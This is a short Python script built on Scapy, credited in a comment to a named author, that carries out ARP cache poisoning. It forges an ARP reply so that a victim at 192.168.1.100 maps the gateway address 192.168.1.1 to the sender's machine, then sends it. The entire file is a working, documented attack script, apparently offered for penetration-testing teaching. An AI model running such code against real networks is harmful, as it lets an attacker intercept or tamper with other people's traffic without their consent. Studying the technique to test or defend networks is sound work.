from scapy.all import *

# Author: Omar Santos

# Perform ARP cache poisoning
def perform_arpcache_poisoning(victim_ip, gateway_ip):
    """
    Performs ARP cache poisoning by sending a crafted ARP packet to associate the gateway IP-MAC mapping
    with the victim IP.

    :param victim_ip: IP address of the victim device whose ARP cache will be poisoned.
    :param gateway_ip: IP address of the legitimate gateway device whose IP-MAC mapping will be spoofed.
    """
    # Construct the ARP packet
    packet = ARP(op=2, pdst=victim_ip, hwdst=getmacbyip(victim_ip), psrc=gateway_ip)

    # Send the ARP packet
    send(packet, verbose=0)

# Specify the victim IP and gateway IP
victim_ip = "192.168.1.100"
gateway_ip = "192.168.1.1"

# Perform ARP cache poisoning
perform_arpcache_poisoning(victim_ip, gateway_ip)
